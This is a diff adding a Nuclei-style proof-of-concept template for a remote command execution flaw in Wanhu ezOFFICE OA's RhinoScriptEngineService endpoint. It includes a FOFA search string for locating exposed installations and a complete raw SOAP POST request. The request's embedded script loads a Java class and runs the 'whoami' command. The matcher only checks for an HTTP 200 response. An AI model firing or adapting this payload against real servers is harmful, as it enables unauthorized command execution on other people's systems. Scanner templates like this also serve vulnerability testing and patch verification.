@@ -1,0 +1,19 @@
+id: poc-skasoxq3omm9v5c7
+info:
+  name: 万户OA ezOffice RhinoScriptEngineService 命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/skasoxq3omm9v5c7'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: skasoxq3omm9v5c7
+    fofa: app="万户网络-ezOFFICE"
+http:
+- raw:
+  - "POST //defaultroot/services/./././RhinoScriptEngineService HTTP/1.1\n\nContent-Type: text/xml; charset=utf-8\n\nSOAPAction: \"\"\n\n\n\n<?xml version='1.0' encoding='UTF-8'?>\n\n  <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:jav=\"http://javascript.script.sun.com\">\n\n    <soapenv:Body>\n\n      <eval xmlns=\"http://127.0.0.1:8080/services/scriptEngine\">\n\n        <arg0 xmlns=\"\">\n\n          <![CDATA[\n\n          try {\n\n          load(\"nashorn:Moziilla_compat.js\");\n\n          } catch (e) {\n\n          }\n\n          importPackage(Packages.java.io);\n\n          importPackage(Packages.java.lang);\n\n          importPackage(Packages.java.util);\n\n          importPackage(Packages.java.net);\n\n\n\n          new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName(\"java.lang.String\")]).newInstance([\"whoami\"]).toString()\n\n\n\n          ]]>\n\n        </arg0>\n\n        <arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\">\n\n        </arg1>\n\n      </eval>\n\n    </soapenv:Body>\n\n  </soapenv:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
